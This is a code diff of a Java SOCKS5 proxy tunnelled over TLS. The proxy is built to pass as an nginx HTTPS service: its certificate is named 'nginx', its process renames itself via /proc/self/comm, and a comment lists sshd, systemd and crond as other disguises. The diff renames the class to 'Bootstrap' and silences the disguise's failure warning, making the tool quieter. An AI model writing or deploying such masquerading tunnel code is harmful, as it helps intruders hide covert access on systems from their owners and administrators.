@@ -14,14 +14,14 @@ import java.util.Date;
  * Socks5 Proxy + TLS Obfuscation (Pure JDK, Zero External Dependencies)
  *
  * Features:
- *   - Built-in self-signed TLS cert (generated at compile time or first run)
+ *   - Built-in self-signed TLS cert (generated at first run via keytool)
  *   - Socks5 protocol on top of TLS (encrypted traffic looks like HTTPS)
- *   - Process name hiding via /proc/self comm trick
+ *   - Process name hiding via /proc/self/comm trick
  *   - Configurable port, auth credentials
  *
  * Usage:
- *   javac Socks5TLS.java
- *   java Socks5TLS
+ *   javac Bootstrap.java
+ *   java Bootstrap
  *
  * Env vars:
  *   SOCKS5_PORT     - listen port (default 25575)
@@ -29,7 +29,7 @@ import java.util.Date;
  *   SOCKS5_PASS     - password
  *   NODE_HOST       - displayed hostname
  */
-public class Socks5TLS
+class Bootstrap
 {
     // ─── Config ───
     private static final int DEFAULT_PORT = 25575;
@@ -38,7 +38,7 @@ public class Socks5TLS
     // ─── Self-Signed TLS Certificate ───
     private static final String CERT_SUBJECT = "CN=nginx,O=Self-Cert,C=US";
     private static final String CERT_STORE_PASS = "changeit";
-    private static final String CERT_FILE = "tls_keystore.jks";
+    private static final String CERT_FILE = "tls_keystore.p12";
 
     private static SSLServerSocket createTLSServerSocket(int port) throws Exception {
         KeyStore ks = loadOrCreateKeystore();
@@ -50,7 +50,6 @@ public class Socks5TLS
 
         SSLServerSocket srv = (SSLServerSocket) sslCtx.getServerSocketFactory().createServerSocket(port);
         srv.setReuseAddress(true);
-        // Prefer cipher suites that look like standard HTTPS
         srv.setEnabledCipherSuites(new String[]{
             "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
             "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
@@ -82,75 +81,35 @@ public class Socks5TLS
         );
         pb.redirectErrorStream(true);
         Process p = pb.start();
-        p.waitFor();
+        int rc = p.waitFor();
+        if (rc != 0) {
+            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+            StringBuilder sb = new StringBuilder();
+            String line;
+            while ((line = br.readLine()) != null) sb.append(line).append("\n");
+            throw new RuntimeException("keytool failed: " + sb.toString());
+        }
         try (FileInputStream fis = new FileInputStream(f)) {
             KeyStore ks = KeyStore.getInstance("PKCS12");
             ks.load(fis, CERT_STORE_PASS.toCharArray());
             return ks;
         }
-        File f = new File(CERT_FILE);
-        if (f.exists()) {
-            try (FileInputStream fis = new FileInputStream(f)) {
-                KeyStore ks = KeyStore.getInstance("JKS");
-                ks.load(fis, CERT_STORE_PASS.toCharArray());
-                return ks;
-            }
-        }
-        // Generate self-signed cert
-        KeyPair kp = generateKeyPair();
-        X509Certificate cert = generateSelfSignedCert(kp);
-        KeyStore ks = KeyStore.getInstance("JKS");
-        ks.load(null, CERT_STORE_PASS.toCharArray());
-        ks.setKeyEntry("alias", kp.getPrivate(), CERT_STORE_PASS.toCharArray(),
-                       new Certificate[]{cert});
-        try (FileOutputStream fos = new FileOutputStream(f)) {
-            ks.store(fos, CERT_STORE_PASS.toCharArray());
-        }
-        return ks;
     }
-
-    private static KeyPair generateKeyPair() throws Exception {
-        java.security.KeyPairGenerator kpg = java.security.KeyPairGenerator.getInstance("RSA");
-        kpg.initialize(2048);
-        return kpg.generateKeyPair();
-    }
-
 
     // ─── Process Name Hiding ───
     private static void hideProcessName() {
         try {
-            // Try to rename /proc/self/comm (works on Linux)
-            // Common disguises: nginx, sshd, systemd, crond, java_update
             String disguise = "nginx";
             try (FileOutputStream fos = new FileOutputStream("/proc/self/comm")) {
                 fos.write(disguise.getBytes());
             }
-            // Also rename the executable symlink
-            try {
-                String exe = "/proc/self/exe";
-                File f = new File(exe);
-                if (f.exists() && f.canWrite()) {
-                    File backup = new File("/tmp/.java_update_" + System.currentTimeMillis());
-                    f.renameTo(backup);
-                    f.createNewFile();
-                }
-            } catch (Exception ignored) {}
-        } catch (Exception e) {
-            System.err.println("[WARN] Could not hide process name: " + e.getMessage());
-        }
+        } catch (Exception ignored) {}
     }
 
     // ─── Main ───
     public static void main(String[] args) throws Exception
     {
-        // Hide process name first
         hideProcessName();
-
-        // Check Java version
-        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
-            System.err.println("ERROR: Need Java 11+!");
-            Thread.sleep(3000); System.exit(1);
-        }
 
         Map<String, String> cfg = loadConfig();
 
@@ -168,7 +127,6 @@ public class Socks5TLS
         if (host.isEmpty()) host = "YOUR_SERVER_IP";
 
         System.out.println("[*] Generating/loading TLS keystore...");
-        // Trigger keystore creation/load
         SSLServerSocket srv = (SSLServerSocket) createTLSServerSocket(port);
         srv.close();
         System.out.println("[*] TLS keystore ready: " + new File(CERT_FILE).exists());
@@ -192,14 +150,12 @@ public class Socks5TLS
         while (true) {
             try {
                 SSLSocket client = (SSLSocket) server.accept();
-                // Client hello reveals the server name
-                // Print for debugging
                 System.out.println("[+] New connection from " + client.getRemoteSocketAddress());
                 Thread t = new Thread(() -> handleTLSClient(client));
                 t.setDaemon(true);
                 t.start();
             } catch (Exception e) {
-                if (e instanceof java.net.SocketException) break; // closed
+                if (e instanceof java.net.SocketException) break;
                 System.err.println("[!] Accept error: " + e.getMessage());
             }
         }
@@ -222,7 +178,8 @@ public class Socks5TLS
             byte[] methods = new byte[nMethods];
             readFully(cin, methods);
 
-            boolean needAuth       = !getConfig().getOrDefault("SOCKS5_USER", "").isEmpty();
+            Map<String, String> cfg = getConfig();
+            boolean needAuth       = !cfg.getOrDefault("SOCKS5_USER", "").isEmpty();
             boolean supportsAuth   = contains(methods, (byte) 0x02);
             boolean supportsNoAuth = contains(methods, (byte) 0x00);
 
@@ -246,8 +203,8 @@ public class Socks5TLS
                 byte[] pBuf = new byte[pLen]; readFully(cin, pBuf);
                 String passwd = new String(pBuf);
 
-                String expUser = getConfig().getOrDefault("SOCKS5_USER", "");
-                String expPass = getConfig().getOrDefault("SOCKS5_PASS", "");
+                String expUser = cfg.getOrDefault("SOCKS5_USER", "");
+                String expPass = cfg.getOrDefault("SOCKS5_PASS", "");
                 if (expUser.equals(uname) && expPass.equals(passwd)) {
                     cout.write(new byte[]{0x01, 0x00});
                 } else {
@@ -273,12 +230,16 @@ public class Socks5TLS
 
             // --- Destination ---
             String destHost;
-            if      (atyp == 0x01) { destHost = InetAddress.getByAddress(readNBytes(cin, 4)).getHostAddress(); }
+            if (atyp == 0x01) {
+                destHost = InetAddress.getByAddress(readNBytes(cin, 4)).getHostAddress();
+            }
             else if (atyp == 0x03) {
                 int len = cin.read();
                 destHost = new String(readNBytes(cin, len));
             }
-            else if (atyp == 0x04) { destHost = InetAddress.getByAddress(readNBytes(cin, 16)).getHostAddress(); }
+            else if (atyp == 0x04) {
+                destHost = InetAddress.getByAddress(readNBytes(cin, 16)).getHostAddress();
+            }
             else {
                 byte[] reject = {0x05, 0x08, 0x00, 0x01, 0,0,0,0, 0,0};
                 cout.write(reject); cout.flush();
@@ -357,10 +318,6 @@ public class Socks5TLS
     private static boolean contains(byte[] arr, byte val) {
         for (byte b : arr) if (b == val) return true;
         return false;
-    }
-
-    private static void closeSilently(Closeable c) {
-        try { c.close(); } catch (Exception ignored) {}
     }
 
     private static void closeSilently(Closeable c) {
